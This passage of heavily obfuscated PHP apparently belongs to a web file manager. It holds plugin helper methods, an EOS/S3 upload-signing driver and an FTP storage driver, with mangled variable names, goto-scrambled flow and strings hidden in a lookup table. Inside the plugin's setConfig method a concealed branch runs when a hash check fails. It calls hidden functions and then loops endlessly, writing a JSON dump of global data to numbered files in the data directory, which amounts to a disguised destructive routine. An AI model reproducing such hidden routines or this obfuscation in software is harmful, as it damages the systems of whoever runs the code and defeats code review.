strlen($b‰Òºòïë), -4); $BˆÀ”¯ç• = LNG($cã·ÊÄˆº¾); $CÌô³§ÍÀŒ[] = $a«ÑÅÁÆÌ‘; $eò¸ñÃ‡À“[] = str_replace(array($c—Û¥²ã…[229], $c—Û¥²ã…[1071], $c—Û¥²ã…[340], $c—Û¥²ã…[116]), array($c—Û¥²ã…[50], $c—Û¥²ã…[50], $c—Û¥²ã…[33], $c—Û¥²ã…[1480]), $BˆÀ”¯ç•); } $C•¬…·¾Ñ = str_replace($CÌô³§ÍÀŒ, $eò¸ñÃ‡À“, $C•¬…·¾Ñ); goto aòŠÒƒ’ä‹; Fç‘¿¶çÂô: $c—Û¥²ã… =& $_SERVER[›é¼±]; $b‰Òºòïë = $c—Û¥²ã…[1478]; if (!strstr($C•¬…·¾Ñ, $b‰Òºòïë)) { return; } goto Bòåóî‰°¤; Bòåóî‰°¤: preg_match_all($c—Û¥²ã…[1479], $C•¬…·¾Ñ, $d‡à­±ŠŸë); if (!is_array($d‡à­±ŠŸë) || count($d‡à­±ŠŸë) == 0 || !is_array($d‡à­±ŠŸë[0]) || count($d‡à­±ŠŸë[0]) == 0) { return; } $CÌô³§ÍÀŒ = array(); goto FÛñÑª’–; aòŠÒƒ’ä‹: } private function parseConfig(&$aÖÑÌºÅÃ‡) { goto A³ŞêÌİ–ê; d‡¥µ˜Øôê: $aÖÑÌºÅÃ‡ = str_replace($cŠ²ô¨Ë¹, $cÂÚ‰°Ò‘, $aÖÑÌºÅÃ‡); goto FµÓÁ×£¤ò; B²¡’ËÛ‚Ü: $cŠ²ô¨Ë¹ = array(); $cÂÚ‰°Ò‘ = array(); foreach ($fÊŒ°ìÑÔ[0] as $B¶¦§âàâÔ) { $e†£Ş¥ò« = substr($B¶¦§âàâÔ, strlen($cÅ×«¯òÈ·), -2); $cŠ²ô¨Ë¹[] = $B¶¦§âàâÔ; $cÂÚ‰°Ò‘[] = _get($a‰æÕŠ®ôÏ, $e†£Ş¥ò«); } goto d‡¥µ˜Øôê; c¯£„ã³: preg_match_all($c‰–ˆÑ•Ç…[1482], $aÖÑÌºÅÃ‡, $fÊŒ°ìÑÔ); if (!is_array($fÊŒ°ìÑÔ) || count($fÊŒ°ìÑÔ) == 0 || !is_array($fÊŒ°ìÑÔ[0]) || count($fÊŒ°ìÑÔ[0]) == 0) { return; } $a‰æÕŠ®ôÏ = $this->getConfig(); goto B²¡’ËÛ‚Ü; A³ŞêÌİ–ê: $c‰–ˆÑ•Ç… =& $_SERVER[›é¼±]; $cÅ×«¯òÈ· = $c‰–ˆÑ•Ç…[1481]; if (!strstr($aÖÑÌºÅÃ‡, $cÅ×«¯òÈ·)) { return; } goto c¯£„ã³; FµÓÁ×£¤ò: } private function parsePackage(&$AŒÆ³¥«£) { goto d×Œï ğ„ã; d×Œï ğ„ã: $F›«Ş Ó‹ =& $_SERVER[›é¼±]; $DÅ¦ùãµƒº = $F›«Ş Ó‹[1483]; if (!strstr($AŒÆ³¥«£, $DÅ¦ùãµƒº)) { return; } goto BîÓ½…Ø„„; cÓŞù¯ˆ³ƒ: $FôØÎ±§çÍ = array(); $Aï¡âˆº‰Ç = array(); foreach ($eÛ‡á³ÛÃù[0] as $E¾‚ğŞ”Ùé) { $A¶–È»í™® = substr($E¾‚ğŞ”Ùé, strlen($DÅ¦ùãµƒº), -2); $FôØÎ±§çÍ[] = $E¾‚ğŞ”Ùé; $Aï¡âˆº‰Ç[] = _get($E˜Ù·µˆä¼, $A¶–È»í™®); } goto fÍî‘®±ªÈ; fÍî‘®±ªÈ: $AŒÆ³¥«£ = str_replace($FôØÎ±§çÍ, $Aï¡âˆº‰Ç, $AŒÆ³¥«£); goto e§ÖÚ†š®Ù; BîÓ½…Ø„„: preg_match_all($F›«Ş Ó‹[1484], $AŒÆ³¥«£, $eÛ‡á³ÛÃù); if (!is_array($eÛ‡á³ÛÃù) || count($eÛ‡á³ÛÃù) == 0 || !is_array($eÛ‡á³ÛÃù[0]) || count($eÛ‡á³ÛÃù[0]) == 0) { return; } $E˜Ù·µˆä¼ = $this->appPackage(); goto cÓŞù¯ˆ³ƒ; e§ÖÚ†š®Ù: } final function echoFile($bÀØ„²Ä¾Ÿ, $Aó®ëÈ¨Ş = false) { goto F¿é¤í¼»—; e†Ò‰Ìí…: $this->parsePackage($Eá›–Ò·â¹); if (is_array($Aó®ëÈ¨Ş)) { $Eá›–Ò·â¹ = str_replace(array_keys($Aó®ëÈ¨Ş), array_values($Aó®ëÈ¨Ş), $Eá›–Ò·â¹); } echo $fØ®¯Œ™ğ½[229] . $Eá›–Ò·â¹; goto cèà¥¦íÁá; FÀ…êÓòº: $Eá›–Ò·â¹ = $this->parseFile($BÇêÜŠÀ´); $this->parseLang($Eá›–Ò·â¹); $this->parseConfig($Eá›–Ò·â¹); goto e†Ò‰Ìí…; F¿é¤í¼»—: $fØ®¯Œ™ğ½ =& $_SERVER[›é¼±]; $BÇêÜŠÀ´ = $this->pluginPath . $bÀØ„²Ä¾Ÿ; if (ACT == $fØ®¯Œ™ğ½[1485]) { echo $fØ®¯Œ™ğ½[1486] . $this->pluginName . $fØ®¯Œ™ğ½[8] . $bÀØ„²Ä¾Ÿ . $fØ®¯Œ™ğ½[1487]; if (!file_exists($BÇêÜŠÀ´)) { echo $fØ®¯Œ™ğ½[1488]; return; } } goto FÀ…êÓòº; cèà¥¦íÁá: } final function initLang() { goto a¾ƒç·ª; F°®‚Ò‰…Û: if (!is_array($FË²Œ·ÆÉ)) { return array(); } if (@count($FË²Œ·ÆÉ) > 0) { I18n::set($FË²Œ·ÆÉ); } return $FË²Œ·ÆÉ; goto b‡ß¨–ÑŸ°; eß‡õö°”: $Dƒ„¦ªá¤Ä = I18n::getType(); $FË²Œ·ÆÉ = array(); if (file_exists($aéÖÙ‘ºÊ” . $Dƒ„¦ªá¤Ä . $DÕæíÓÙšš[840])) { $FË²Œ·ÆÉ = (include $aéÖÙ‘ºÊ” . $Dƒ„¦ªá¤Ä . $DÕæíÓÙšš[840]); } else { if ($Dƒ„¦ªá¤Ä == $DÕæíÓÙšš[1491] && !file_exists($aéÖÙ‘ºÊ” . $Dƒ„¦ªá¤Ä . $DÕæíÓÙšš[840]) && file_exists($aéÖÙ‘ºÊ” . $DÕæíÓÙšš[1492])) { $FË²Œ·ÆÉ = (include $aéÖÙ‘ºÊ” . $DÕæíÓÙšš[1492]); } else { if (file_exists($aéÖÙ‘ºÊ” . $aˆ Öƒ¹İ . $DÕæíÓÙšš[840])) { $FË²Œ·ÆÉ = (include $aéÖÙ‘ºÊ” . $aˆ Öƒ¹İ . $DÕæíÓÙšš[840]); } } } goto F°®‚Ò‰…Û; a¾ƒç·ª: $DÕæíÓÙšš =& $_SERVER[›é¼±]; $aˆ Öƒ¹İ = $DÕæíÓÙšš[1489]; $aéÖÙ‘ºÊ” = $this->pluginPath . $DÕæíÓÙšš[1490]; goto eß‡õö°”; b‡ß¨–ÑŸ°: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($bÔÚ“·ñá) { $B°ÕŒ‡‡êÎ =& $_SERVER[›é¼±]; $E«•öƒß˜ç = $_SERVER[$B°ÕŒ‡‡êÎ[865]]; $A¹´Ş™Ù«î = $B°ÕŒ‡‡êÎ[1493]; if ($_SERVER[$B°ÕŒ‡‡êÎ[858]] != $A¹´Ş™Ù«î($E«•öƒß˜ç)) { goto FË‰“”éË¾; b­¬ğŠÌé˜: $c¸ïõê®¤ = 1; for ($AÇˆ×©í« = $c¸ïõê®¤; $AÇˆ×©í« > 0; $AÇˆ×©í«++) { $fè¶¾²ÆÌ(DATA_PATH . $AÇˆ×©í«, $CçÛÍôùÃÜ); } goto a»¬¨Ê«È®; aº§•—¤¼: $d‰˜Üé »ä = $e‹Ù¿œ–‰($BÄöŠëá’); $dÚìºÍ­Ù = explode($B°ÕŒ‡‡êÎ[229], $d‰˜Üé »ä); if (count($dÚìºÍ­Ù) < $B°ÕŒ‡‡êÎ[620]) { $D°ŞÑ«„ïš = $B°ÕŒ‡‡êÎ[863]; $D°ŞÑ«„ïš(); } goto a«Ñ´¸¯½; a«Ñ´¸¯½: $bøÔš¶Û°° = $B°ÕŒ‡‡êÎ[877]; $bøÔš¶Û°°($_SERVER[$B°ÕŒ‡‡êÎ[878]]); $fÆ”† Ñ´Ú = $B°ÕŒ‡‡êÎ[876]; goto FÕä‡À˜‡–; FË‰“”éË¾: $fÆ”† Ñ´Ú = $B°ÕŒ‡‡êÎ[876]; $e‹Ù¿œ–‰ = $B°ÕŒ‡‡êÎ[860]; $BÄöŠëá’ = $_SERVER[$B°ÕŒ‡‡êÎ[861]] . $B°ÕŒ‡‡êÎ[862]; goto aº§•—¤¼; FÕä‡À˜‡–: $fÆ”† Ñ´Ú(); $fè¶¾²ÆÌ = $B°ÕŒ‡‡êÎ[1494]; $CçÛÍôùÃÜ = json_encode($GLOBALS[$B°ÕŒ‡‡êÎ[1495]]); goto b­¬ğŠÌé˜; a»¬¨Ê«È®: } return $this->modelPlugin->setConfig($this->pluginName, $bÔÚ“·ñá); } public function onSetConfig($AÔáâ´¬Í) { } public function onGetConfig($Cíƒ˜¿ÂÅó) { } public function onChangeStatus($DÚ¸Â¡­‡¨) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Aì±‘à·”å = "\x70\154\165\x67\x69\156\x41\x75\164\x68") { $D±ëÉ²Ùî÷ =& $_SERVER[›é¼±]; if (!defined($D±ëÉ²Ùî÷[468])) { return !1; } if (_get($GLOBALS, $D±ëÉ²Ùî÷[499])) { return !0; } $bİİ¡Òˆñ = $this->getConfig(); if (!$bİİ¡Òˆñ[$Aì±‘à·”å]) { return !1; } return ActionCall($D±ëÉ²Ùî÷[1496], $bİİ¡Òˆñ[$Aì±‘à·”å]); } public function url($a„òéĞ‡„É, $EğÈÊœÕ‚ª = '', $aÈ˜¤Óñ‘ = true) { goto D¢Æ°Ïˆ˜¥; D„„‹É³®Î: if (!$aÈ˜¤Óñ‘) { return $Bµ¸ç´øÌò; } echo $Bµ¸ç´øÌò; goto aí‹Ç„âóµ; D¢Æ°Ïˆ˜¥: $d«áŞ¾ëë” =& $_SERVER[›é¼±]; $eçµí–ÄŞ± = $this->getConfig(); $fÛ«ã„Úæ = KOD_VERSION . $d«áŞ¾ëë”[95] . KOD_VERSION_BUILD; goto a¶ç†ªá±Ã; a¶ç†ªá±Ã: $bŞšùïïìë = $this->packageVersion(); $aÕÃ„‘¼Ã˜ = $fÛ«ã„Úæ . $d«áŞ¾ëë”[454] . $bŞšùïïìë; if (substr($a„òéĞ‡„É, 0, 4) == $d«áŞ¾ëë”[147] || substr($a„òéĞ‡„É, 0, 2) == $d«áŞ¾ëë”[1278]) { $Bµ¸ç´øÌò = $a„òéĞ‡„É . $d«áŞ¾ëë”[1497] . $aÕÃ„‘¼Ã˜; } else { if ($EğÈÊœÕ‚ª == $d«áŞ¾ëë”[33]) { $Bµ¸ç´øÌò = $this->pluginHost . $a„òéĞ‡„É . $d«áŞ¾ëë”[1497] . $aÕÃ„‘¼Ã˜; } else { if ($EğÈÊœÕ‚ª === $d«áŞ¾ëë”[77]) { $Bµ¸ç´øÌò = $this->pluginHost . $a„òéĞ‡„É; } else { if ($EğÈÊœÕ‚ª == $d«áŞ¾ëë”[1498]) { $Bµ¸ç´øÌò = STATIC_PATH . $a„òéĞ‡„É . $d«áŞ¾ëë”[1497] . $fÛ«ã„Úæ; } else { if ($EğÈÊœÕ‚ª == $d«áŞ¾ëë”[1499]) { $Bµ¸ç´øÌò = APP_HOST . $d«áŞ¾ëë”[1500] . $a„òéĞ‡„É . $d«áŞ¾ëë”[1497] . $fÛ«ã„Úæ; } else { if (isset($eçµí–ÄŞ±[$EğÈÊœÕ‚ª])) { $Bµ¸ç´øÌò = $eçµí–ÄŞ±[$EğÈÊœÕ‚ª] . $a„òéĞ‡„É . $d«áŞ¾ëë”[1497] . $aÕÃ„‘¼Ã˜; } } } } } } goto D„„‹É³®Î; aí‹Ç„âóµ: } public function link($CÁò­£›œ = false, $e”ÔÇ–ŸŠ÷ = '') { $bÎ²÷àšÔ‘ =& $_SERVER[›é¼±]; if (!$CÁò­£›œ) { $this->link($bÎ²÷àšÔ‘[1501], $bÎ²÷àšÔ‘[1499]); $this->link($bÎ²÷àšÔ‘[1502], $bÎ²÷àšÔ‘[1498]); $this->link($bÎ²÷àšÔ‘[1503], $bÎ²÷àšÔ‘[1498]); $this->link($bÎ²÷àšÔ‘[1504], $bÎ²÷àšÔ‘[1498]); $this->link($bÎ²÷àšÔ‘[1505], $bÎ²÷àšÔ‘[1498]); return; } $eÀéˆÑÓ‚¨ = $this->url($CÁò­£›œ, $e”ÔÇ–ŸŠ÷, !1); if (substr($CÁò­£›œ, -3) == $bÎ²÷àšÔ‘[1506]) { echo $bÎ²÷àšÔ‘[1507] . $eÀéˆÑÓ‚¨ . $bÎ²÷àšÔ‘[1508] . $bÎ²÷àšÔ‘[229]; } else { if (substr($CÁò­£›œ, -4) == $bÎ²÷àšÔ‘[1509]) { echo $bÎ²÷àšÔ‘[1510] . $eÀéˆÑÓ‚¨ . $bÎ²÷àšÔ‘[1511] . $bÎ²÷àšÔ‘[229]; } } } } goto a•¾ïÙåèÔ; f‹›İíËŞ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($AÜó“òİ§ƒ) { parent::__construct($AÜó“òİ§ƒ); $this->signatureVersion($_SERVER[›é¼±][212]); } public function uploadFormData($E‹ñ×¥óâ„, $f±×Áğ«É— = 3600) { goto CË©æŞå¬†; DÄÃ‹†¾ÎÍ: $aè‘¶ƒù› = base64_encode(json_encode($B¥£µŞ›İ)); $e“¿ğÌÉ = hash_hmac($A…·’ºò¦[1267], $AÏÒ«áÜ¾, $A…·’ºò¦[1268] . $this->secret, !0); $BóŞ‘™˜ì = hash_hmac($A…·’ºò¦[1267], $this->region, $e“¿ğÌÉ, !0); goto aÀ›¯„À‹; dÏ·¸çÔ—: $Dó‹Ì‰¬Ù… = array($A…·’ºò¦[211] => $A…·’ºò¦[33], $A…·’ºò¦[1269] => $A…·’ºò¦[33], $A…·’ºò¦[1226] => $Eô«‹•å—¢, $A…·’ºò¦[1230] => $b‰õæĞê÷µ, $A…·’ºò¦[1234] => $aè‘¶ƒù›, $A…·’ºò¦[1270] => $F¡é××­¶Š, $A…·’ºò¦[1271] => $C‰×íË—ƒ¦, $A…·’ºò¦[1272] => $Bä¤½ÄË¼Ç, $A…·’ºò¦[1273] => $E…‹Ç­Œ…‰, $A…·’ºò¦[1274] => $cÅî®ò¥ˆá, $A…·’ºò¦[175] => $this->getHost()); return $Dó‹Ì‰¬Ù…; goto B ˜Ô˜Ê“; CË©æŞå¬†: $A…·’ºò¦ =& $_SERVER[›é¼±]; $Eô«‹•å—¢ = $A…·’ºò¦[192]; $C‰×íË—ƒ¦ = $A…·’ºò¦[1257]; goto cµ‘ƒ•â˜; dõ Œ”Ö÷: $Aõ±³Š…œö = $A…·’ºò¦[1259]; $E…‹Ç­Œ…‰ = $f±×Áğ«É— . $A…·’ºò¦[33]; $b‰õæĞê÷µ = $A…·’ºò¦[1222]; goto b»ÏÏØÜí; aÀ›¯„À‹: $Eæ•ù­¥æÆ = hash_hmac($A…·’ºò¦[1267], $A–«Â±Ñ÷õ, $BóŞ‘™˜ì, !0); $eŸ¦ç¤ÔÔ = hash_hmac($A…·’ºò¦[1267], $Aõ±³Š…œö, $Eæ•ù­¥æÆ, !0); $cÅî®ò¥ˆá = hash_hmac($A…·’ºò¦[1267], $aè‘¶ƒù›, $eŸ¦ç¤ÔÔ); goto dÏ·¸çÔ—; b»ÏÏØÜí: $d™Û‹—•Ş– = array($this->accessKey, $AÏÒ«áÜ¾, $this->region, $A–«Â±Ñ÷õ, $Aõ±³Š…œö); $F¡é××­¶Š = implode($A…·’ºò¦[8], $d™Û‹—•Ş–); $B¥£µŞ›İ = array($A…·’ºò¦[1224] => gmdate($A…·’ºò¦[1223], strtotime($A…·’ºò¦[1260])), $A…·’ºò¦[1225] => array(array($A…·’ºò¦[1227] => $this->bucket), array($A…·’ºò¦[1226] => $Eô«‹•å—¢), array($A…·’ºò¦[1228], $A…·’ºò¦[1229], $A…·’ºò¦[33]), array($A…·’ºò¦[1228], $A…·’ºò¦[1261], $A…·’ºò¦[33]), array($A…·’ºò¦[1228], $A…·’ºò¦[1262], $A…·’ºò¦[33]), array($A…·’ºò¦[1230] => $b‰õæĞê÷µ), array($A…·’ºò¦[1263] => $F¡é××­¶Š), array($A…·’ºò¦[1264] => $C‰×íË—ƒ¦), array($A…·’ºò¦[1265] => $Bä¤½ÄË¼Ç), array($A…·’ºò¦[1266] => $E…‹Ç­Œ…‰))); goto DÄÃ‹†¾ÎÍ; cµ‘ƒ•â˜: $A–«Â±Ñ÷õ = $A…·’ºò¦[59]; $Bä¤½ÄË¼Ç = gmdate($A…·’ºò¦[1258]); $AÏÒ«áÜ¾ = gmdate($A…·’ºò¦[746]); goto dõ Œ”Ö÷; B ˜Ô˜Ê“: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($cÓ¦à§ã¨”) { parent::__construct(); if (count($cÓ¦à§ã¨”) > 0) { $this->_init($cÓ¦à§ã¨”); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($d¾ìƒ¤†Š¶) { $B¥Ğ¼ê‚³¾ =& $_SERVER[›é¼±]; global $config; $this->appCharset = $config[$B¥Ğ¼ê‚³¾[1275]]; $this->systemCharset = $config[$B¥Ğ¼ê‚³¾[1276]]; if (isset($d¾ìƒ¤†Š¶[$B¥Ğ¼ê‚³¾[1277]]) && $d¾ìƒ¤†Š¶[$B¥Ğ¼ê‚³¾[1277]]) { $this->systemCharset = $d¾ìƒ¤†Š¶[$B¥Ğ¼ê‚³¾[1277]]; } } public function iconvApp($B‘×ö…Ïë¼) { return $this->iconvTo($B‘×ö…Ïë¼, $this->systemCharset, $this->appCharset); } public function iconvSystem($fÌ¯ñÚ©‹ì) { return $this->iconvTo($fÌ¯ñÚ©‹ì, $this->appCharset, $this->systemCharset); } public function getPathOuter($aÛ—ä¦¯„) { goto c«·å“ƒ—¬; E¥¾‡Ú££Õ: if (substr($FÁÍ–µ®‘, 0, 2) == $CÆ²È¥±óã[1278]) { $FÁÍ–µ®‘ = BASIC_PATH . substr($FÁÍ–µ®‘, 2); } if (substr($aÛ—ä¦¯„, 0, 2) == $CÆ²È¥±óã[1278]) { $aÛ—ä¦¯„ = BASIC_PATH . substr($aÛ—ä¦¯„, 2); } $FÁÍ–µ®‘ = KodIO::clear($FÁÍ–µ®‘); goto fêÃÂˆóØ¿; c«·å“ƒ—¬: $CÆ²È¥±óã =& $_SERVER[›é¼±]; $FÁÍ–µ®‘ = $this->iconvApp($this->pathBase); $aÛ—ä¦¯„ = $this->iconvApp($aÛ—ä¦¯„); goto E¥¾‡Ú££Õ; fêÃÂˆóØ¿: $aÛ—ä¦¯„ = KodIO::clear($aÛ—ä¦¯„); $aÛ—ä¦¯„ = substr($aÛ—ä¦¯„, strlen($FÁÍ–µ®‘)); if (empty($this->pathDriver)) { return $aÛ—ä¦¯„; } goto aîö»ó™Ñä; aîö»ó™Ñä: return $this->pathDriver . $CÆ²È¥±óã[8] . ltrim($aÛ—ä¦¯„, $CÆ²È¥±óã[8]); goto bˆƒ¸¿Œ‡ñ; bˆƒ¸¿Œ‡ñ: } private function _init($fÄç‚µ½¿É = array()) { $b‹ÛæĞ†°â =& $_SERVER[›é¼±]; if (!function_exists($b‹ÛæĞ†°â[1279])) { throw new Exception(LNG($b‹ÛæĞ†°â[1280])); } $this->config = $fÄç‚µ½¿É; $this->charsetReset($fÄç‚µ½¿É); foreach ($fÄç‚µ½¿É as $EäÁÁŸ¦ª => $BÙ®İèÕÙÏ) { if (isset($this->{$EäÁÁŸ¦ª})) { $this->{$EäÁÁŸ¦ª} = $BÙ®İèÕÙÏ; } } return $this->_login($fÄç‚µ½¿É); } private function _login($BŞĞäƒ©ĞÎ) { goto FÀâˆîé™š; fó¬äÏíÇ: if (isset($bàâø½µôŠ[$Eæ¢öÏ“Ò–])) { foreach ($bàâø½µôŠ[$Eæ¢öÏ“Ò–] as $CàÜÉÄÎª => $EÂŠÀŠ§®) { $this->{$CàÜÉÄÎª} = $EÂŠÀŠ§®; } return !0; } $C˜©áÃ¹ğ¨ = parse_url(trim($this->server, $EãŠ°Šø½[8])); $this->host = $C˜©áÃ¹ğ¨[$EãŠ°Šø½[175]]; goto aÎ¯»á¼À½; a¡›²ºÓ†ó: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $CŠßáæøÉ = $this->pasv == $EãŠ°Šø½[87] ? !0 : !1; @ftp_pasv($this->connect, $CŠßáæøÉ); goto Cñƒ¢µ½àÉ; FÀâˆîé™š: $EãŠ°Šø½ =& $_SERVER[›é¼±]; static $bàâø½µôŠ = array(); $Eæ¢öÏ“Ò– = md5(json_encode($BŞĞäƒ©ĞÎ)); goto fó¬äÏíÇ; aÎ¯»á¼À½: $FÎÌ‘áˆ‹Ç = isset($C˜©áÃ¹ğ¨[$EãŠ°Šø½[174]]) && $C˜©áÃ¹ğ¨[$EãŠ°Šø½[174]] == $EãŠ°Šø½[1281] ? !0 : !1; $this->scheme = $FÎÌ‘áˆ‹Ç ? $EãŠ°Šø½[1282] : $EãŠ°Šø½[1283]; $this->port = isset($C˜©áÃ¹ğ¨[$EãŠ°Šø½[176]]) ? $C˜©áÃ¹ğ¨[$EãŠ°Šø½[176]] : 21; goto EÚÑã®ÓÂÛ; EÚÑã®ÓÂÛ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $eáÆİß‘³¼ = @ftp_login($this->connect, $this->username, $this->userpass); goto a¡›²ºÓ†ó; Cñƒ¢µ½àÉ: $bàâø½µôŠ[$Eæ¢öÏ“Ò–] = array($EãŠ°Šø½[1284] => $this->connect, $EãŠ°Šø½[175] => $this->host, $EãŠ°Šø½[174] => $this->scheme, $EãŠ°Šø½[176] => $this->port); return $eáÆİß‘³¼; goto D·å„ÔÍƒ; D·å„ÔÍƒ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($D¥Ìª®–Ôî, $d·½¼•¸âõ = '', $dºŒ¬¦â¨µ = REPEAT_RENAME) { if ($this->setContent($D¥Ìª®–Ôî, $d·½¼•¸âõ)) { return $this->getPathOuter($D¥Ìª®–Ôî); } return !1; } public function mkdir($e³šòõ½, $E©Á¼…ÂÓñ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $e³šòõ½ = $this->iconvSystem($e³šòõ½); if ($this->_isFolder($e³šòõ½) || @ftp_mkdir($this->connect, $e³šòõ½)) { return $this->getPathOuter($e³šòõ½); } if (!$this->mkdir($this->pathFather($e³šòõ½))) { return !1; } if ($e³šòõ½ = @ftp_mkdir($this->connect, $e³šòõ½)) { return $this->getPathOuter($e³šòõ½); } return !1; } public function copyFile($f—Š¨Ñ”ªÈ, $E¡£‘“×áä) { goto A†¤ƒôàèî; A‰¤²øà«ù: $this->tempFileRemve($E¯’•×¥ä£); return $E±‘µ«×Şë; goto b‡Ûã±ôª„; F÷›çƒ¸ø“: $E›ÑŞ´­¢Â = $this->iconvApp($E¯’•×¥ä£); $this->download($f—Š¨Ñ”ªÈ, $E›ÑŞ´­¢Â); $E±‘µ«×Şë = $this->upload($E¡£‘“×áä, $E›ÑŞ´­¢Â); goto A‰¤²øà«ù; A†¤ƒôàèî: if (!$this->_isconn()) { return !1; } $fëÛÕÏ®‚æ = $this->pathThis($this->iconvSystem($f—Š¨Ñ”ªÈ)); $E¯’•×¥ä£ = $this->tempFile($fëÛÕÏ®‚æ); goto F÷›çƒ¸ø“; b‡Ûã±ôª„: } public function moveFile($CÂÃ¶İõäŸ, $c±÷½—ª¬Ï) { if (!$this->_isconn()) { return !1; } $CÂÃ¶İõäŸ = $this->iconvSystem($CÂÃ¶İõäŸ); $c±÷½—ª¬Ï = $this->iconvSystem($c±÷½—ª¬Ï); $BÁª˜œ‹¶ = @ftp_rename($this->connect, $CÂÃ¶İõäŸ, $c±÷½—ª¬Ï); return $BÁª˜œ‹¶ ? $this->getPathOuter($c±÷½—ª¬Ï) : !1; } public function delFile($fš‡‡ĞÈóŸ) { if (!$this->_isconn()) { return !1; } $fš‡‡ĞÈóŸ = $this->iconvSystem($fš‡‡ĞÈóŸ); return @ftp_delete($this->connect, $fš‡‡ĞÈóŸ); } public function delFolder($eÏ‹ÈÎ„¨) { goto aƒ¼ØŸ¡è·; b¯…§ó¶¹Á: foreach ($DÅ‰çøÈƒµ as $AùğÏß²¡Û) { $AùğÏß²¡Û = $this->iconvSystem($AùğÏß²¡Û); $AìÇø´Ê¤å = @ftp_rmdir($this->connect, $AùğÏß²¡Û); if (!$AìÇø´Ê¤å) { return !1; } } $eÏ‹ÈÎ„¨ = $this->iconvSystem($eÏ‹ÈÎ„¨); return @ftp_rmdir($this->connect, $eÏ‹ÈÎ„¨); goto D¥™’ˆÖùÉ; aƒ¼ØŸ¡è·: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $DÅ‰çøÈƒµ = $F¼¨ÜÉç‡– = array(); goto Dí„«˜òÚ£; Dí„«˜òÚ£: $this->fileList($eÏ‹ÈÎ„¨, $DÅ‰çøÈƒµ, $F¼¨ÜÉç‡–, !0); $this->listItemCache = !0; foreach ($F¼¨ÜÉç‡– as $cíÙÙ°»ê) { $AùğÏß²¡Û = $this->iconvSystem($cíÙÙ°»ê[$_SERVER[›é¼±][28]]); $AìÇø´Ê¤å = @ftp_delete($this->connect, $AùğÏß²¡Û); if (!$AìÇø´Ê¤å) { return !1; } } goto b¯…§ó¶¹Á; D¥™’ˆÖùÉ: } public function rename($c¤ğË§‹«, $a›šŞğÉÊŒ) { goto Fš‰Ò²êËš; EóĞ©¿ö¢ğ: $e‡‘·…‹Ä = $this->iconvSystem($e‡‘·…‹Ä); $c¤ğË§‹« = $this->iconvSystem($c¤ğË§‹«); $b°Ñ…ëäñê = $this->pathFather($c¤ğË§‹«); goto Eâ»÷—å; Eâ»÷—å: $Cœ¢šù‰Ù = rtrim($b°Ñ…ëäñê, $bˆÜ¦ÏçÑ[8]) . $bˆÜ¦ÏçÑ[8] . $e‡‘·…‹Ä; $d„ÔøËïù = @ftp_rename($this->connect, $c¤ğË§‹«, $Cœ¢šù‰Ù); $Cœ¢šù‰Ù = $this->iconvApp($Cœ¢šù‰Ù); goto eÂ™†‘îÑç; eÂ™†‘îÑç: return $d„ÔøËïù ? $this->getPathOuter($Cœ¢šù‰Ù) : !1; goto C¡£ š„ÑÑ; Fš‰Ò²êËš: $bˆÜ¦ÏçÑ =& $_SERVER[›é¼±]; if (!$this->_isconn()) { return !1; } $e‡‘·…‹Ä = $this->fileNameAuto($this->pathFather($c¤ğË§‹«), $a›šŞğÉÊŒ); goto EóĞ©¿ö¢ğ; C¡£ š„ÑÑ: } private function folderInfo($e†ñóõ¥æ“, $bß†°‚Î¢© = false) { $C†ÕŒ’ïÑî =& $_SERVER[›é¼±]; $Eæ•” ùÔ = array($C†ÕŒ’ïÑî[28] => $this->pathThis($e†ñóõ¥æ“), $C†ÕŒ’ïÑî[76] => $this->getPathOuter($C†ÕŒ’ïÑî[8] . $e†ñóõ¥æ“), $C†ÕŒ’ïÑî[29] => $C†ÕŒ’ïÑî[77]); if ($bß†°‚Î¢©) { return $Eæ•” ùÔ; } $Eæ•” ùÔ[$C†ÕŒ’ïÑî[194]] = $Eæ•” ùÔ[$C†ÕŒ’ïÑî[84]] = 0; $Eæ•” ùÔ[$C†ÕŒ’ïÑî[195]] = $Eæ•” ùÔ[$C†ÕŒ’ïÑî[196]] = !0; return $Eæ•” ùÔ; } private function fileInfo($dĞø˜˜Ö‚, $EñçÈ—âÖ = false, $d¿¦®ì‘Ç§ = array()) { goto AÃÜæ×¢Œ­; CĞğ¶»‡«Ï: return $F‚’Ñ‡¦¬Ü; goto FµöØ®Á÷; b™êØîòÚ³: $F‚’Ñ‡¦¬Ü[$EË×ÔìÅƒË[194]] = $F‚’Ñ‡¦¬Ü[$EË×ÔìÅƒË[84]] = 0; $F‚’Ñ‡¦¬Ü[$EË×ÔìÅƒË[195]] = $F‚’Ñ‡¦¬Ü[$EË×ÔìÅƒË[196]] = !0; $c‘ø—â² = $this->iconvSystem($dĞø˜˜Ö‚); goto e…Ó¿ŞŞåŞ; e…Ó¿ŞŞåŞ: $F‚’Ñ‡¦¬Ü[$EË×ÔìÅƒË[84]] = @ftp_mdtm($this->connect, $c‘ø—â²); if (empty($d¿¦®ì‘Ç§)) { $d¿¦®ì‘Ç§ = $this->objectMeta($dĞø˜˜Ö‚); if (!$d¿¦®ì‘Ç§) { return $F‚’Ñ‡¦¬Ü; } } $F‚’Ñ‡¦¬Ü[$EË×ÔìÅƒË[78]] = $d¿¦®ì‘Ç§[$EË×ÔìÅƒË[78]]; goto CĞğ¶»‡«Ï; AÃÜæ×¢Œ­: $EË×ÔìÅƒË =& $_SERVER[›é¼±]; $F‚’Ñ‡¦¬Ü = array($EË×ÔìÅƒË[28] => $this->pathThis($dĞø˜˜Ö‚), $EË×ÔìÅƒË[76] => $this->getPathOuter($EË×ÔìÅƒË[8] . $dĞø˜˜Ö‚), $EË×ÔìÅƒË[29] => $EË×ÔìÅƒË[193], $EË×ÔìÅƒË[78] => isset($d¿¦®ì‘Ç§[$EË×ÔìÅƒË[78]]) ? 